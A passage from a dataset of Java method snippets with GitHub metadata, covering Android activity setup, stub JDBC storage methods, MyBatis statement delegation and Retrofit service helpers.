Toolbar toolbar = findViewById(R.id.toolbar);\n        setSupportActionBar(toolbar);\n        getSupportActionBar().setDisplayHomeAsUpEnabled(true);\n        // Create the adapter that will return a fragment for each of the three\n        // primary sections of the activity.\n        mSectionsPagerAdapter = new PagerAdapter(getSupportFragmentManager());\n\n        // Set up the ViewPager with the sections adapter.\n        mViewPager = findViewById(R.id.container);\n        mViewPager.setAdapter(mSectionsPagerAdapter);\n\n        TabLayout tabLayout = findViewById(R.id.tabs);\n        tabLayout.setupWithViewPager(mViewPager);\n\n        /*FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);\n        fab.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View view) {\n                Snackbar.make(view, \"Replace with your own action\", Snackbar.LENGTH_LONG)\n                        .setAction(\"Action\", null).show();\n            }\n        });*/\n\n\n\n        setupSlidingLayer();\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/adminModule/ShopsList/ShopsDatabase.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["NotifyTitleChanged", "NotifySort"], "modifiers": ["public"]}}, {"id": 58421, "method_name": "setupSlidingLayer", "class_name": "ShopsDatabase", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void setupSlidingLayer()\n    {\n\n        ////slidingLayer.setShadowDrawable(R.drawable.sidebar_shadow);\n        //slidingLayer.setShadowSizeRes(R.dimen.shadow_size);\n\n        if(slidingLayer!=null) {\n            slidingLayer.setChangeStateOnTap(true);\n            slidingLayer.setSlidingEnabled(true);\n            slidingLayer.setPreviewOffsetDistance(15);\n            slidingLayer.setOffsetDistance(10);\n            slidingLayer.setStickTo(SlidingLayer.STICK_TO_RIGHT);\n\n//            DisplayMetrics metrics = new DisplayMetrics();\n//            getWindowManager().getDefaultDisplay().getMetrics(metrics);\n\n            //RelativeLayout.LayoutParams layoutParams = new RelativeLayout.LayoutParams(250, ViewGroup.LayoutParams.MATCH_PARENT);\n\n            //slidingContents.setLayoutParams(layoutParams);\n\n            //slidingContents.setMinimumWidth(metrics.widthPixels-50);\n\n\n            if (getSupportFragmentManager().findFragmentByTag(TAG_SLIDING_LAYER)==null)\n            {\n                getSupportFragmentManager()\n                        .beginTransaction()\n                        .add(R.id.slidinglayerfragment,new SlidingLayerSortShops(),TAG_SLIDING_LAYER)\n                        .commit();\n            }\n\n        }\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/adminModule/ShopsList/ShopsDatabase.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["NotifyTitleChanged", "NotifySort"], "modifiers": ["public"]}}, {"id": 58422, "method_name": "sortClick", "class_name": "ShopsDatabase", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void sortClick()\n    {\n        slidingLayer.openLayer(true);\n//        showToastMessage(\"Open sliding \");\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/adminModule/ShopsList/ShopsDatabase.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["NotifyTitleChanged", "NotifySort"], "modifiers": ["public"]}}, {"id": 58423, "method_name": "showToastMessage", "class_name": "ShopsDatabase", "params": ["String"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void showToastMessage(String message)\n    {\n        Toast.makeText(this,message,Toast.LENGTH_SHORT).show();\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/adminModule/ShopsList/ShopsDatabase.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["NotifyTitleChanged", "NotifySort"], "modifiers": ["public"]}}, {"id": 58424, "method_name": "onOptionsItemSelected", "class_name": "ShopsDatabase", "params": ["MenuItem"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onOptionsItemSelected(MenuItem item) {\n        // Handle action bar item clicks here. The action bar will\n        // automatically handle clicks on the Home/Up button, so long\n        // as you specify a parent activity in AndroidManifest.xml.\n        int id = item.getItemId();\n\n        //noinspection SimplifiableIfStatement\n        if (id == R.id.action_settings) {\n            return true;\n        }\n\n        return super.onOptionsItemSelected(item);\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/adminModule/ShopsList/ShopsDatabase.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["NotifyTitleChanged", "NotifySort"], "modifiers": ["public"]}}, {"id": 58425, "method_name": "NotifyTitleChanged", "class_name": "ShopsDatabase", "params": ["String", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void NotifyTitleChanged(String title, int tabPosition) {\n        mSectionsPagerAdapter.setTitle(title,tabPosition);\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/adminModule/ShopsList/ShopsDatabase.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["NotifyTitleChanged", "NotifySort"], "modifiers": ["public"]}}, {"id": 58426, "method_name": "makeFragmentName", "class_name": "ShopsDatabase", "params": ["int", "int"], "throws": null, "modifiers": ["static", "private"], "return_type": "String", "snippet": "    private static String makeFragmentName(int viewId, int index) {\n        return \"android:switcher:\" + viewId + \":\" + index;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/adminModule/ShopsList/ShopsDatabase.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["NotifyTitleChanged", "NotifySort"], "modifiers": ["public"]}}, {"id": 58427, "method_name": "onCreateOptionsMenu", "class_name": "ShopsDatabase", "params": ["Menu"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onCreateOptionsMenu(Menu menu) {\n        super.onCreateOptionsMenu(menu);\n        MenuInflater inflater = getMenuInflater();\n        inflater.inflate(R.menu.menu_shop_approvals, menu);\n\n\n        // Associate searchable configuration with the SearchView\n        SearchView searchView = (SearchView) menu.findItem(R.id.action_search).getActionView();\n        SearchManager searchManager = (SearchManager) getSystemService(SEARCH_SERVICE);\n        searchView.setSearchableInfo(searchManager.getSearchableInfo(getComponentName()));\n\n\n\n        MenuItem item = menu.findItem(R.id.action_search);\n\n        item.setOnActionExpandListener(new MenuItem.OnActionExpandListener() {\n            @Override\n            public boolean onMenuItemActionExpand(MenuItem item) {\n                return true;\n            }\n\n            @Override\n            public boolean onMenuItemActionCollapse(MenuItem item) {\n\n\n//                Fragment fragment = getSupportFragmentManager().findFragmentByTag(TAG_FRAGMENT);\n\n                Fragment fragment = getSupportFragmentManager()\n                        .findFragmentByTag(\n                                makeFragmentName(mViewPager.getId(),mViewPager.getCurrentItem())\n                        );\n\n\n                if(fragment instanceof NotifySearch)\n                {\n                    ((NotifySearch) fragment).endSearchMode();\n                }\n\n//                Toast.makeText(PickFromShopInventory.this, \"onCollapsed Called \", Toast.LENGTH_SHORT).show();\n\n                return true;\n            }\n        });\n\n\n\n\n        return true;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/adminModule/ShopsList/ShopsDatabase.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["NotifyTitleChanged", "NotifySort"], "modifiers": ["public"]}}, {"id": 58428, "method_name": "onNewIntent", "class_name": "ShopsDatabase", "params": ["Intent"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onNewIntent(Intent intent) {\n        super.onNewIntent(intent);\n        handleIntent(intent);\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/adminModule/ShopsList/ShopsDatabase.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["NotifyTitleChanged", "NotifySort"], "modifiers": ["public"]}}, {"id": 58429, "method_name": "handleIntent", "class_name": "ShopsDatabase", "params": ["Intent"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void handleIntent(Intent intent) {\n\n        if (Intent.ACTION_SEARCH.equals(intent.getAction())) {\n            String query = intent.getStringExtra(SearchManager.QUERY);\n            //use the query to search your data somehow\n\n//            Toast.makeText(this,query,Toast.LENGTH_SHORT).show();\n\n//            Fragment fragment = getSupportFragmentManager().findFragmentByTag(TAG_FRAGMENT);\n\n            Fragment fragment = getSupportFragmentManager()\n                    .findFragmentByTag(\n                            makeFragmentName(mViewPager.getId(),mViewPager.getCurrentItem())\n                    );\n\n\n            if(fragment instanceof NotifySearch)\n            {\n                ((NotifySearch) fragment).search(query);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/adminModule/ShopsList/ShopsDatabase.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["NotifyTitleChanged", "NotifySort"], "modifiers": ["public"]}}, {"id": 58430, "method_name": "notifySortChanged", "class_name": "ShopsDatabase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void notifySortChanged() {\n\n        Fragment fragment = getSupportFragmentManager()\n                .findFragmentByTag(\n                        makeFragmentName(mViewPager.getId(),mViewPager.getCurrentItem())\n                );\n\n        if(fragment instanceof NotifySort)\n        {\n            ((NotifySort)fragment).notifySortChanged();\n        }\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/adminModule/ShopsList/ShopsDatabase.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["NotifyTitleChanged", "NotifySort"], "modifiers": ["public"]}}, {"id": 58431, "method_name": "findViewById", "class_name": "ViewFinder", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View findViewById(int viewId) {\n        return activity != null ? activity.findViewById(viewId) : view.findViewById(viewId);\n    }", "url": "https://raw.githubusercontent.com/itliuhao/haoLabrary/master/baselibrary/src/main/java/com/wander/baselibrary/ioc/ViewFinder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58432, "method_name": "getASMTransformerClass", "class_name": "MixinLoader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String[] getASMTransformerClass() {\n\t\treturn new String[0];\n\t}", "url": "https://raw.githubusercontent.com/2b2t-Utilities/2b2t-Utilities/master/src/main/java/me/tigermouthbear/utilities/mixin/MixinLoader.java", "stars": "2", "class_props": {"extends": null, "implements": ["IFMLLoadingPlugin"], "modifiers": ["public"]}}, {"id": 58433, "method_name": "getModContainerClass", "class_name": "MixinLoader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getModContainerClass() {\n\t\treturn null;\n\t}", "url": "https://raw.githubusercontent.com/2b2t-Utilities/2b2t-Utilities/master/src/main/java/me/tigermouthbear/utilities/mixin/MixinLoader.java", "stars": "2", "class_props": {"extends": null, "implements": ["IFMLLoadingPlugin"], "modifiers": ["public"]}}, {"id": 58434, "method_name": "getSetupClass", "class_name": "MixinLoader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getSetupClass() {\n\t\treturn null;\n\t}", "url": "https://raw.githubusercontent.com/2b2t-Utilities/2b2t-Utilities/master/src/main/java/me/tigermouthbear/utilities/mixin/MixinLoader.java", "stars": "2", "class_props": {"extends": null, "implements": ["IFMLLoadingPlugin"], "modifiers": ["public"]}}, {"id": 58435, "method_name": "injectData", "class_name": "MixinLoader", "params": ["Map<String,Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void injectData(Map<String, Object> data) {\n\t}", "url": "https://raw.githubusercontent.com/2b2t-Utilities/2b2t-Utilities/master/src/main/java/me/tigermouthbear/utilities/mixin/MixinLoader.java", "stars": "2", "class_props": {"extends": null, "implements": ["IFMLLoadingPlugin"], "modifiers": ["public"]}}, {"id": 58436, "method_name": "getAccessTransformerClass", "class_name": "MixinLoader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getAccessTransformerClass() {\n\t\treturn null;\n\t}", "url": "https://raw.githubusercontent.com/2b2t-Utilities/2b2t-Utilities/master/src/main/java/me/tigermouthbear/utilities/mixin/MixinLoader.java", "stars": "2", "class_props": {"extends": null, "implements": ["IFMLLoadingPlugin"], "modifiers": ["public"]}}, {"id": 58437, "method_name": "exists", "class_name": "VideoManagerJdbcStoragerImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean exists(String deviceId) {\n\t\t// TODO Auto-generated method stub\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/storager/jdbc/VideoManagerJdbcStoragerImpl.java", "stars": "29", "class_props": {"extends": null, "implements": ["IVideoManagerStorager"], "modifiers": ["public"]}}, {"id": 58438, "method_name": "create", "class_name": "VideoManagerJdbcStoragerImpl", "params": ["Device"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean create(Device device) {\n\t\t// TODO Auto-generated method stub\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/storager/jdbc/VideoManagerJdbcStoragerImpl.java", "stars": "29", "class_props": {"extends": null, "implements": ["IVideoManagerStorager"], "modifiers": ["public"]}}, {"id": 58439, "method_name": "update", "class_name": "VideoManagerJdbcStoragerImpl", "params": ["Device"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean update(Device device) {\n\t\t// TODO Auto-generated method stub\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/storager/jdbc/VideoManagerJdbcStoragerImpl.java", "stars": "29", "class_props": {"extends": null, "implements": ["IVideoManagerStorager"], "modifiers": ["public"]}}, {"id": 58440, "method_name": "queryVideoDevice", "class_name": "VideoManagerJdbcStoragerImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Device", "snippet": "\tpublic Device queryVideoDevice(String deviceId) {\n\t\t// TODO Auto-generated method stub\n\t\treturn null;\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/storager/jdbc/VideoManagerJdbcStoragerImpl.java", "stars": "29", "class_props": {"extends": null, "implements": ["IVideoManagerStorager"], "modifiers": ["public"]}}, {"id": 58441, "method_name": "queryVideoDeviceList", "class_name": "VideoManagerJdbcStoragerImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "List<Device>", "snippet": "\tpublic List<Device> queryVideoDeviceList(String[] deviceIds) {\n\t\t// TODO Auto-generated method stub\n\t\treturn null;\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/storager/jdbc/VideoManagerJdbcStoragerImpl.java", "stars": "29", "class_props": {"extends": null, "implements": ["IVideoManagerStorager"], "modifiers": ["public"]}}, {"id": 58442, "method_name": "delete", "class_name": "VideoManagerJdbcStoragerImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean delete(String deviceId) {\n\t\t// TODO Auto-generated method stub\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/storager/jdbc/VideoManagerJdbcStoragerImpl.java", "stars": "29", "class_props": {"extends": null, "implements": ["IVideoManagerStorager"], "modifiers": ["public"]}}, {"id": 58443, "method_name": "online", "class_name": "VideoManagerJdbcStoragerImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean online(String deviceId) {\n\t\t// TODO Auto-generated method stub\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/storager/jdbc/VideoManagerJdbcStoragerImpl.java", "stars": "29", "class_props": {"extends": null, "implements": ["IVideoManagerStorager"], "modifiers": ["public"]}}, {"id": 58444, "method_name": "outline", "class_name": "VideoManagerJdbcStoragerImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean outline(String deviceId) {\n\t\t// TODO Auto-generated method stub\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/storager/jdbc/VideoManagerJdbcStoragerImpl.java", "stars": "29", "class_props": {"extends": null, "implements": ["IVideoManagerStorager"], "modifiers": ["public"]}}, {"id": 58445, "method_name": "prepare", "class_name": "RoutingStatementHandler", "params": ["Connection", "Integer"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Statement", "snippet": "  public Statement prepare(Connection connection, Integer transactionTimeout) throws SQLException {\n    return delegate.prepare(connection, transactionTimeout);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/statement/RoutingStatementHandler.java", "stars": "15", "class_props": {"extends": null, "implements": ["StatementHandler"], "modifiers": ["public"]}}, {"id": 58446, "method_name": "parameterize", "class_name": "RoutingStatementHandler", "params": ["Statement"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void parameterize(Statement statement) throws SQLException {\n    delegate.parameterize(statement);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/statement/RoutingStatementHandler.java", "stars": "15", "class_props": {"extends": null, "implements": ["StatementHandler"], "modifiers": ["public"]}}, {"id": 58447, "method_name": "batch", "class_name": "RoutingStatementHandler", "params": ["Statement"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void batch(Statement statement) throws SQLException {\n    delegate.batch(statement);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/statement/RoutingStatementHandler.java", "stars": "15", "class_props": {"extends": null, "implements": ["StatementHandler"], "modifiers": ["public"]}}, {"id": 58448, "method_name": "update", "class_name": "RoutingStatementHandler", "params": ["Statement"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int update(Statement statement) throws SQLException {\n    return delegate.update(statement);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/statement/RoutingStatementHandler.java", "stars": "15", "class_props": {"extends": null, "implements": ["StatementHandler"], "modifiers": ["public"]}}, {"id": 58449, "method_name": "query", "class_name": "RoutingStatementHandler", "params": ["Statement", "ResultHandler"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "List<E>", "snippet": "  public <E> List<E> query(Statement statement, ResultHandler resultHandler) throws SQLException {\n    return delegate.query(statement, resultHandler);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/statement/RoutingStatementHandler.java", "stars": "15", "class_props": {"extends": null, "implements": ["StatementHandler"], "modifiers": ["public"]}}, {"id": 58450, "method_name": "queryCursor", "class_name": "RoutingStatementHandler", "params": ["Statement"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Cursor<E>", "snippet": "  public <E> Cursor<E> queryCursor(Statement statement) throws SQLException {\n    return delegate.queryCursor(statement);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/statement/RoutingStatementHandler.java", "stars": "15", "class_props": {"extends": null, "implements": ["StatementHandler"], "modifiers": ["public"]}}, {"id": 58451, "method_name": "getBoundSql", "class_name": "RoutingStatementHandler", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BoundSql", "snippet": "  public BoundSql getBoundSql() {\n    return delegate.getBoundSql();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/statement/RoutingStatementHandler.java", "stars": "15", "class_props": {"extends": null, "implements": ["StatementHandler"], "modifiers": ["public"]}}, {"id": 58452, "method_name": "getParameterHandler", "class_name": "RoutingStatementHandler", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ParameterHandler", "snippet": "  public ParameterHandler getParameterHandler() {\n    return delegate.getParameterHandler();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/statement/RoutingStatementHandler.java", "stars": "15", "class_props": {"extends": null, "implements": ["StatementHandler"], "modifiers": ["public"]}}, {"id": 58453, "method_name": "contextLoads", "class_name": "ProjetoecommerceApplicationTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid contextLoads() {\n\t}", "url": "https://raw.githubusercontent.com/vinicius058/projetoecommerce/master/src/test/java/br/com/ecommerce/projetoecommerce/ProjetoecommerceApplicationTests.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58454, "method_name": "getService", "class_name": "BaseAbstractService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "IBaseService", "snippet": "    public IBaseService  getService() {return generalService;}", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/BaseAbstractService.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58455, "method_name": "disposed", "class_name": "BaseAbstractService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void disposed() {\n        mCompositeDisposable.clear();\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/BaseAbstractService.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58456, "method_name": "freshStartChannell", "class_name": "BaseAbstractService", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void freshStartChannell() {\n        disposed();\n        clearHeaders();\n        WebapiSingleton.clearCookieJar();\n        setFinalUrl(Utils.getBaseUrlEmpty());\n        setCurrentGridItem(null);\n        setUserAgent(Utils.getUserAgent());\n        setCallback(null);\n        setFinalVideoLinkCallback(null);\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/BaseAbstractService.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58457, "method_name": "setUserAgent", "class_name": "BaseAbstractService", "params": ["String"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setUserAgent(String userAgent) {\n        LinkedHashMap<String,String> headers = getHeaders();\n        headers.put(\"User-Agent\",userAgent);\n        setHeaders(headers);\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/BaseAbstractService.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58458, "method_name": "setFragmentActivity", "class_name": "BaseAbstractService", "params": ["FragmentActivity"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setFragmentActivity(FragmentActivity fragmentActivity) {\n        this.fragmentActivity = fragmentActivity;\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/BaseAbstractService.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58459, "method_name": "addCompositeDeisposable", "class_name": "BaseAbstractService", "params": ["Disposable"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void addCompositeDeisposable(Disposable d) {\n        mCompositeDisposable.add(d);\n   }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/BaseAbstractService.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58460, "method_name": "startSpinner", "class_name": "BaseAbstractService", "params": ["FragmentActivity", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void startSpinner(FragmentActivity fragmentActivity,int mainfragment) {\n       if (fragmentActivity == null) return;\n        try {\n            if (spinnerFragment.isAdded() || mainfragment == -1) return;\n            fragmentActivity.getSupportFragmentManager().beginTransaction().add(mainfragment, spinnerFragment).commit();\n        } catch (Exception e) {\n\n        }\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/BaseAbstractService.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58461, "method_name": "stopSpinner", "class_name": "BaseAbstractService", "params": ["FragmentActivity"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void stopSpinner(FragmentActivity fragmentActivity) {\n        if (fragmentActivity == null) return;\n        try {\n            fragmentActivity.getSupportFragmentManager().beginTransaction().remove(spinnerFragment).commit();\n        } catch (Exception e) {\n\n        }\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/BaseAbstractService.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58462, "method_name": "clearHeaders", "class_name": "BaseAbstractService", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void clearHeaders() {\n        WebapiSingleton.clearHeaders();\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/BaseAbstractService.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58463, "method_name": "setHeaders", "class_name": "BaseAbstractService", "params": ["LinkedHashMap<String,String>"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setHeaders(LinkedHashMap<String,String> headers) {\n        WebapiSingleton.setHeaders(headers);\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/BaseAbstractService.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58464, "method_name": "getHeaders", "class_name": "BaseAbstractService", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "LinkedHashMap<String,String>", "snippet": "    protected LinkedHashMap<String,String> getHeaders() {\n        return WebapiSingleton.getHeaders();\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/BaseAbstractService.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58465, "method_name": "setFinalUrl", "class_name": "BaseAbstractService", "params": ["String"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setFinalUrl(String url) {\n        finalUrl = url;\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/BaseAbstractService.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58466, "method_name": "getFinalUrl", "class_name": "BaseAbstractService", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "    protected String getFinalUrl() {\n        return finalUrl;\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/BaseAbstractService.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58467, "method_name": "setCurrentGridItem", "class_name": "BaseAbstractService", "params": ["GridItem"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected  void setCurrentGridItem(GridItem gridItem) {\n        currentGridItem = gridItem;\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/BaseAbstractService.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58468, "method_name": "getCurrentGridItem", "class_name": "BaseAbstractService", "params": [], "throws": null, "modifiers": ["private"], "return_type": "GridItem", "snippet": "    private GridItem getCurrentGridItem() {\n        return currentGridItem;\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/BaseAbstractService.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58469, "method_name": "setCallback", "class_name": "BaseAbstractService", "params": ["OnAsyncTaskLoadCompletes"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setCallback(OnAsyncTaskLoadCompletes callback) {\n        mCallback = callback;\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/BaseAbstractService.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58470, "method_name": "setFinalVideoLinkCallback", "class_name": 